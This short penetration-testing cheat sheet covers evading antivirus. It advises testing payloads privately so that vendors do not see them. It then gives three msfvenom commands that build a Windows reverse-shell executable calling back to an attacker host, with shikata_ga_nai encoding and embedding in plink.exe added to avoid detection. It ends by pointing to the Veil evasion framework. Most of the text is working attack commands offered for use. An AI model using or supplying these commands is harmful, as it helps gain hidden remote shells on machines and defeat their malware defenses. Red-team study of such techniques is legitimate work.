# Antivirus evasion

The easiest way to test payloads is to upload them to [VirusTotal](https://www.virustotal.com/#/home/upload). They share uploads with anti-malware companies so if you're planning to use a payload in a red team operation, it might be better to test it in a VM with your target network's antivirus installed.

Most antivirus software will detect unencoded payloads like this:
```
msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine] LPORT=4444 -f exe -o evil.exe
```
Even when a payload is encoded with [shikata ga nai](https://security.stackexchange.com/questions/130256/what-is-shikata-ga-nai) it is still generally detectable by antivirus because the executable template is recognized:

```
msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine] LPORT=4444 -f exe -e
x86/shikata_ga_nai -i 9 -o evil.exe
```
Embedding the shellcode in a Windows PE executable is a little less detectable: 
```
msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine] LPORT=4444 -f exe -e
x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o
evil.exe
```
## Further reading
* [Veil tutorial](https://www.veil-framework.com/veil-tutorial/)
